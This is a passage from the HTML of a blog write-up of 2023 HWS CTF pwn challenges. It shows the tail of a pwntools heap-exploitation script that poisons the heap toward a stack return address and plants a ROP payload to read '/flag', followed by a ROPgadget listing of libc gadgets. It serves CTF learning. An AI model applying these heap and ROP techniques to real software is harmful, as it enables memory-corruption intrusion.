class="number">700</span>,<span class="string">b&quot;x&quot;</span>*<span class="number">1</span>) <span class="comment">#20</span></span><br><span class="line">dele(<span class="number">19</span>)</span><br><span class="line">dele(<span class="number">20</span>)</span><br><span class="line">edit(<span class="number">20</span>,p64(edit_ret-<span class="number">8</span>))</span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;e&quot;</span>*<span class="number">1</span>) <span class="comment">#21</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;f&quot;</span>*<span class="number">1</span>) <span class="comment">#22</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&quot;g&quot;</span>*<span class="number">1</span>) <span class="comment">#23</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x0017F9)&#x27;) #edit</span></span><br><span class="line"><span class="comment"># db(&#x27;b *$rebase(0x01545)&#x27;)#malloc </span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#24</span></span><br><span class="line">add(<span class="number">700</span>,<span class="string">b&#x27;a&#x27;</span>) <span class="comment">#25</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">b&#x27;/flag\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">25</span>,p64(__libc_start_main_243_stack-<span class="number">8</span>)+payload)</span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line">io.interactive()</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">grxer@Ubantu20 ~/D/s/2/mi&gt; ROPgadget  --binary ./libc.so.6 --only &#x27;pop|ret&#x27; | grep rdx</span></span><br><span class="line"><span class="string">0x000000000015f8c5 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000119211 : pop rdx ; pop r12 ; ret</span></span><br><span class="line"><span class="string">0x000000000015f8c6 : pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x000000000010257d : pop rdx ; pop rcx ; pop rbx ; ret</span></span><br><span class="line"><span class="string">0x0000000000142c92 : pop rdx ; ret</span></span><br><span class="line"><span class="string">0x00000000000dfc12 : pop rdx ; ret 0x10</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Writing</a></li>
         
          <li><a href="/search/">Search</a></li>
         
          <li><a href="/tags/">Tag</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ezhttp"><span class="toc-number">1.</span> <span class="toc-text">ezhttp</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.0.1.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#fmt"><span class="toc-number">2.</span> <span class="toc-text">fmt</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mi"><span class="toc-number">3.</span> <span class="toc-text">mi</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%AF%94%E8%B5%9B%E6%97%B6%E7%8C%AA%E8%84%91%E8%BF%87%E8%BD%BD%E7%9A%84EXP"><span class="toc-number">3.0.1.</span> <span class="toc-text">比赛时猪脑过载的EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B5%9B%E5%90%8E%E5%86%99wp%E5%A4%B4%E8%84%91%E6%B8%85%E9%86%92%EF%BC%8C%E7%9B%B4%E6%8E%A5%E4%BF%AE%E6%94%B9edit%E8%BF%94%E5%9B%9E%E5%9C%B0%E5%9D%80%E7%9A%84%EF%BC%8C%E4%B8%8D%E7%94%A8%E6%B3%84%E9%9C%B2pie%E7%9A%84exp"><span class="toc-number">3.0.2.</span> <span class="toc-text">赛后写wp头脑清醒，直接修改edit返回地址的，不用泄露pie的exp</span></a></li></ol></li></ol></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://grxer.gitee.io/2023/07/17/2023hws/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://grxer.gitee.io/2023/07/17/2023hws/&text=2023 HWS pwn"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://grxer.gitee.io/2023/07/17/2023hws/&is_video=false&description=2023 HWS pwn"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=2023 HWS pwn&body=Check out this article: https://grxer.gitee.io/2023/07/17/2023hws/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://grxer.gitee.io/2023/07/17/2023hws/&title=2023 HWS pwn"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://grxer.gitee.io/2023/07/17/2023hws/&name=2023 HWS pwn&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://grxer.gitee.io/2023/07/17/2023hws/&t=2023 HWS pwn"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    bxz
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?a22ef0bec4e4a9c7337bea6e37ff55c1";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

</body>
</html>
